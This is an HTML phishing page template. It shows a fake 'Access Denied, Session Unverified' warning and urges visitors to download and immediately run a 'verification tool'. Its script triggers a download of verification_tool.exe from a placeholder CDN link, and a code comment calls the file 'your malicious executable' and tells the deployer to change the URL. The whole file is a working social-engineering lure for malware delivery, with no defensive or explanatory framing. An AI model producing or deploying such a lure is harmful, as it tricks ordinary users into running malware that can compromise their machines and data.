<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session Verification Required</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f8f9fa;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: white;
            padding: 50px;
            border-radius: 8px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.07);
            max-width: 600px;
            border: 1px solid #e0e0e0;
        }
        .icon {
            font-size: 48px;
            color: #dc3545; /* Red for danger/unverified */
            margin-bottom: 20px;
        }
        h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 15px;
            color: #1a1a1a;
        }
        .status {
            font-size: 18px;
            color: #dc3545;
            font-weight: 600;
            margin-bottom: 25px;
            padding: 10px;
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            border-radius: 5px;
        }
        p {
            font-size: 16px;
            color: #555;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        .verify-button {
            background-color: #dc3545;
            color: white;
            font-size: 18px;
            font-weight: 600;
            padding: 15px 40px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s ease, transform 0.1s ease;
        }
        .verify-button:hover {
            background-color: #c82333;
            transform: translateY(-2px);
        }
        .verify-button:active {
            transform: translateY(0);
        }
        .footer-note {
            font-size: 12px;
            color: #aaa;
            margin-top: 40px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">⚠️</div>
        <h1>Access Denied</h1>
        <div class="status">
            Status: Unverified
        </div>
        <p>You cannot access this site because your session could not be verified. To resolve this, you must download and run the verification tool below to authenticate your browser.</p>

        <button id="downloadButton" class="verify-button">Download Verification Tool</button>
        
        <p class="footer-note">This action is required to proceed. Please run the tool immediately after downloading.</p>
    </div>

    <script>
        document.getElementById('downloadButton').addEventListener('click', function() {
            // The URL to your malicious executable
            const downloadUrl = 'https://your-cdn-link.com/verification_tool.exe'; // <-- IMPORTANT: CHANGE THIS
            const fileName = 'verification_tool.exe';

            // Create and trigger the download
            const a = document.createElement('a');
            a.href = downloadUrl;
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            // Optional: Change button text to provide feedback
            this.textContent = 'Download Started';
            this.disabled = true;
        });
    </script>
</body>
</html>
